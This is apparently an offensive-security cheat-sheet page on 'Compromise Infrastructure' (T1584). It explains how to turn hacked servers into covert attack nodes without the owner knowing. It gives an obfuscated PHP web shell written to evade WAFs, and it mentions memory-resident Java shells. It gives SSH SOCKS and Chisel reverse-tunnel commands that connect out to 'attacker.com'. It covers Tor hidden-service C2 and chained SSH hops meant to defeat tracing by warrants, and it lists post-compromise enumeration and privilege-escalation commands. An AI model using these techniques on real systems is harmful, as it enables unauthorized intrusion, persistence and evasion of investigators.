---
title: Compromise Infrastructure
tags: [webshell, pivoting, socks, proxy, wordpress]
description: Using compromised servers as operational nodes. Obfuscated webshells, SOCKS proxying, and pivoting into internal networks.
date: 2024-01-02
---

# Compromise Infrastructure (T1584)

Compromising a server is just step one. The goal is to turn that server into a **Operational Node** that works for you without the owner knowing.

---

## 1. Web Shells (Persistence)
A web shell gives you command execution via HTTP.
*Challenge:* WAFs (Web Application Firewalls) block `system($_GET['cmd'])`.

### Obfuscation Techniques
Don't use cleartext function names.

```php
// Novice: Flagged immediately
<?php system($_GET['c']); ?>

// Expert: String Manipulation & Variable Functions
<?php
    $a = 'sys';
    $b = 'tem';
    $cmd = $a . $b; // "system"
    $input = $_REQUEST['id']; // "id"
    $cmd($input);
?>
```

### The "Unkillable" Shell (Memory Resident)
If you compromise a Java/Tomcat server, inject a **Memory Shell (Behinder/Godzilla)**. It lives in the Java process memory and deletes the JSP file from disk. It survives until the service restarts.

---

## 2. Pivoting & Proxying
You verified a compromised server (`web01`). Now you want to use its IP to attack others.

### SOCKS Proxy (SSH)
If you have SSH credentials:
```bash
# Dynamic Port Forwarding (SOCKS5 on port 1080)
ssh -D 1080 user@compromised-server.com
```
Now, configure your browser or tools (ProxyChains) to use `127.0.0.1:1080`.
`proxychains nmap -sT 192.168.1.1` -> Traffic originates from the compromised server.

### Reverse Proxy (Chisel / Ligolo)
If the server is behind a firewall (NAT) and you can't SSH *in*, you must tunnel *out*.

**Tools**:
- **Chisel**: HTTP tunnel over TCP/UDP.
  - *Attacker (Server)*: `./chisel server -p 8000 --reverse`
  - *Victim (Client)*: `./chisel client attacker.com:8000 R:socks`
- **Ligolo-ng**: TUN interface pivoting (The modern standard). Creates a virtual network interface on your attacker machine that routes straight into the victim network.

---

## 3. Botnet / Mesh Integration
Integrating the node into a larger mesh network for anonymity.

### Tor Hidden Services
Install `tor` on the compromised box. Configure a Hidden Service looking at port 80.
- **Benefit**: You access the C2 via `.onion` address. No direct IP connection to the compromised box.

### SSH Mesh
Link multiple compromised servers together using SSH jumps.
`Attacker -> Comp_A -> Comp_B -> Target`.
Logging at the Target only sees `Comp_B`. Tracing back to you takes multiple warrants/subpoenas.

---

## 4. Living off the Land (Post-Compromise)
Don't install `nmap` on a compromised server. Use what is there.

### Linux Enumeration
```bash
# Check network connections
ss -antp

# Find SUID binaries (Privilege Escalation)
find / -perm -u=s -type f 2>/dev/null

# Check cron jobs (Persistence)
cat /etc/crontab
```

### Windows Enumeration
```powershell
# Network Recon
Test-NetConnection -ComputerName 192.168.1.5 -Port 445

# Active Directory Recon (if domain joined)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
